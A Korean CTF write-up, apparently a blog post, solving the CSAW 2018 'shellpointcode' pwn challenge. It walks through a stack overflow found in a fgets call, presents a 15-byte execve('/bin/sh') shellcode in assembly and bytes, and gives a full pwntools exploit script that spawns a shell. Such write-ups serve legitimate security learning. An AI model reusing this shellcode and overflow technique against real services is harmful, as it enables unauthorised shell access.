---
layout: post
title: "[CSAW CTF Quals 2018] shellpointcode(shell->code) 풀이"
date: 2018-12-08 00:41
categories: "[Pwn]CTF"
tags: N0N4M3D
---

>### [shellpointcode](/pic/CTF/CSAW2018/shellpointcode/shellpointcode)

- - -
# 1. 코드 분석

{: refdef: style="text-align: center;"}
![checksec](/pic/CTF/CSAW2018/shellpointcode/checksec.png)
{: refdef}

문제 이름도 그렇고, NX가 안걸려 있는 걸 보니 쉘코드쓰라는 문제인 것 같네요.

{: refdef: style="text-align: center;"}
![main](/pic/CTF/CSAW2018/shellpointcode/main.png)
{: refdef}

메인은 볼께 없네요

{: refdef: sytle="text-align: center;"}
![nononode](/pic/CTF/CSAW2018/shellpointcode/nononode.png)
{: refdef}

각각 15바이트를 받을 수 있고 BOF 일어날 곳은 딱히 없어요

{: refdef: sytle="text-align: center;"}
![printnode](/pic/CTF/CSAW2018/shellpointcode/printnode.png)
{: refdef}

어떤 주소값을 leak 해주고, 그 주소값 다음에 있는 문자열을 출력해줘요

{: refdef: sytle="text-align: center;"}
![goodbye](/pic/CTF/CSAW2018/shellpointcode/goodbye.png)
{: refdef}

이니셜을 s에 저장해요. 그런데 변수 s는 rbp-0x3에 위치해 있는데 

fgets 함수로 32바이트나 받아버려서 BOF가 일어나네요!!!

# 2. 프로그램 분석

{: refdef: sytle="text-align: center;"}
![run](/pic/CTF/CSAW2018/shellpointcode/run.png)
{: refdef}

{: refdef: sytle="text-align: center;"}
![stack](/pic/CTF/CSAW2018/shellpointcode/stack.png)
{: refdef}

터미널에서 위와 같이 실행시키고 gdb를 이용해 goodbye 함수가 끝나기 직전에 브레이크포인트를 잡고 분석해봤어요. 
저 스택 화면을 보기 쉽게 아래의 그림으로 정리해봤어요.

{: refdef: sytle="text-align: center;"}
![struct](/pic/CTF/CSAW2018/shellpointcode/struct.png)
{: refdef}

aslr로 인해 주소가 계속 바뀌어도 저 스택의 형태는 일정하게 유지가 돼요.

이제 취약점들도 찾았겠다 스택 구조도 파악했겠다 찾을꺼 다 찾았으니 삽질을 시작해볼까요?

# 3. 공격 방법

1시간 반? 정도 이런저런 삽질을 해본 결과 공격할 수 있는 방법을 찾게되었어요! 

1. node 1에 쉘코드를 삽입한다

2. node 2에 "///bin/sh\x00" 문자열을 삽입한다

3. fgets에서 일어나는 bof 취약점을 이용해 goodbye의 ret를 node1으로 변경한다

4. exploit 성공?

쉘코드는 15바이트 내로 다음과 같이 작성했어요

```asm
push rbx	/* rbx값 == 0x00 */
pop rax		/* rax == 0x00 */
pop rdi		/* rdi == rsp */
push rax	/* push 0x00 */
pop rdx		/* rdx == 0x00 */
push rax	/* push 0x00 */
pop rsi		/* rsi == 0x00 */
mov al,0x3b	/* al == 0x3b */
syscall
```

64비트 시스템 콜을 이용해 execve('rdi',0,0)을 실행하는 쉘코드입니다.

rbx의 값이 0x00이란 것은 gdb로 분석하면서 알았어요

- - -
쉘코드를 만들기 위해 다음의 사이트를 참고

> https://defuse.ca/online-x86-assembler.htm

> http://crasy.tistory.com/75

- - -

저 시나리오 대로 값들을 넣으면 스택 구조는 다음과 같이 될꺼에요.

{: refdef: sytle="text-align: center;"}
![attack](/pic/CTF/CSAW2018/shellpointcode/attack.png)
{: refdef}

저기서 goodbye 함수가 끝나면서 ret을 실행시키면 rip는 node 1을 가리킬 것 이고, 

스택 구조는 다음과 같이 변하게 되요.

{: refdef: sytle="text-align: center;"}
![attack2](/pic/CTF/CSAW2018/shellpointcode/attack2.png)
{: refdef}

이 상태에서 저 쉘코드가 실행되면 execve("/bin/sh\x00",0,0)가 만들어지고 실행됩니다ㅎㅎ

아 참고로 "/bin/sh\x00"가 아닌 "///bin/sh\x00"으로 적어주는 이유는 fgets 함수로 

문자열을 넣으면 \x0a와 \x00을 문자열 끝에 넣어주는데 이게 "/b"까지 침범해서 "//"를 추가해준 거에요

# 4. 공격 코드

```python
from pwn import *
#context.log_level = "debug"

shellcode = "\x53\x58\x5F\x50\x5A\x50\x5E\xB0\x3B\x0F\x05"
s = remote('localhost', 4444)
#s = process('./shellpointcode')

s.recvuntil('node 1:  \n')
s.sendline(shellcode.rjust(15,'\x90'))
s.recvuntil('node 2: \n')
s.sendline('///bin/sh\x00')

s.recvuntil("node.next: ")
leak = s.recvuntil('\n')
ret = int(leak,16)+40
log.info(hex(ret))

#pause()

s.recvuntil("initials?\n")

payload = "A"*11
payload += p64(ret)
payload += p64(int(leak,16)+10)
s.sendline(payload)

#pause()

s.interactive()
```